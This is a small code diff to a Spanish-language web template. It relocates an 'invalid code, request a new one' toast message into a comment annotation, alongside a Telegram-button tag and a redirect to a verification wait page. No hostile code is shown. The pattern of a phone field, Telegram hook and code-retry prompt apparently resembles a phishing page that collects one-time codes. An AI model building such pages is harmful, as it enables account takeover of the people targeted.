@@ -1,4 +1,5 @@
 {{-- @telegram-button: Telefono --}}
+{{-- @toast-message: El codigo ingresado no es valido, solicite uno nuevo --}}
 <!DOCTYPE html>
 <html lang="es">
 <head>
@@ -122,7 +123,6 @@
     <x-control
         :auto-completar="false"
         redirect-url="/verificacion/wait"
-        toast-message="El codigo ingresado no es valido, solicite uno nuevo"
     />
 </body>
 </html>
